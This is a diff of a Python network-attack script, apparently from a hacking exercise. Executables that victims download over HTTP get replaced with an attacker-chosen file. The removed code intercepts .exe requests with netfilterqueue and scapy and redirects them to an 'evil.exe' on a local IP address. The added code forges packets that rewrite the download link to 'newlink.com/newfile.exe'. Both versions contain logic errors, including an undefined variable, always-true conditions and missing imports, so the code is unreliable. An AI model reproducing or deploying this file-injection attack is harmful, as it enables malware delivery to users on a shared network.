@@ -1,31 +1,14 @@
 #!/usr/bin/env python
+def packet_callback(packet):
+    # Check if the packet is a HTTP GET request
+    if packet[TCP].sport == 80 and packet.haslayer(Raw) and b'GET' in packet[Raw].load:
+        # Get the original download link
+        download_link = packet[Raw].load.split(b'\r\n')[0].split()[1]
+        # Replace the download link with the new one
+        new_packet = IP(dst=packet[IP].dst,src=packet[IP].src)/\
+                     TCP(dport=packet[TCP].dport, sport=packet[TCP].sport,seq=packet[TCP].seq,ack=packet[TCP].ack,flags="PA")/\
+                     Raw(load=packet[Raw].load.replace(download_link, b'http://newlink.com/newfile.exe'))
+        # Send the modified packet
+        send(new_packet)
 
-import netfilterqueue
-import scapy.all as scapy
-
-ack_list=[]
-
-def set_load(packet,load):
-    packet[scapy.Raw].load=load
-    del scapy_packet[scapy.IP].len
-    del scapy_packet[scapy.IP].chksum
-    del scapy_packet[scapy.TCP].chksum
-    return  packet
-def process_packet(packet):
-    scapy_packet=scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80 or 1000:
-            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.101.130" not in scapy_packet[scapy.Raw].load:
-                print("[+] exe request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == 80 or 1000:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                modified_packet=set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.101.130/exe/evil.exe\n\n")
-                packet.set_payload(str(scapy_packet))
-    packet.accept()
-
-queue= netfilterqueue.NetfilterQueue()
-queue.bind(0,process_packet)
-queue.run()
+sniff(prn=packet_callback)
